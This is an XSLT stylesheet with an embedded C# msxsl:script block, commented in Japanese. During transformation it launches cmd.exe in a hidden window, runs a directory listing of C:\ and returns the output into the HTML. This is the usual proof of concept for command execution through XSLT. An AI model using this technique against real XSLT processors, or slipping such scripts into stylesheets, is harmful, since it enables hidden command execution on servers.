<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">
  <msxsl:script language="CSharp" implements-prefix="user">
  <![CDATA[
public string Main(){
  //Processオブジェクトを作成
  System.Diagnostics.Process p = new System.Diagnostics.Process();

  //ComSpec(cmd.exe)のパスを取得して、FileNameプロパティに指定
  p.StartInfo.FileName = System.Environment.GetEnvironmentVariable("ComSpec");
  //出力を読み取れるようにする
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardInput = false;
  //ウィンドウを表示しないようにする
  p.StartInfo.CreateNoWindow = true;
  //コマンドラインを指定（"/c"は実行後閉じるために必要）
  p.StartInfo.Arguments = @"/c dir c:\ /w";
  //起動
  p.Start();

  //出力を読み取る
  string results = p.StandardOutput.ReadToEnd();

  //プロセス終了まで待機する
  //WaitForExitはReadToEndの後である必要がある
  //(親プロセス、子プロセスでブロック防止のため)
  p.WaitForExit();
  p.Close();

  //出力された結果を表示
  return results;
}
  ]]>
  </msxsl:script>
  <xsl:output method="html" encoding="utf-8" indent="yes"/>
  <xsl:param name="l10n.gentext.default.language">ja</xsl:param>
  <xsl:template match="data">
      <xsl:value-of select="user:Main()"/>
  </xsl:template>
</xsl:stylesheet>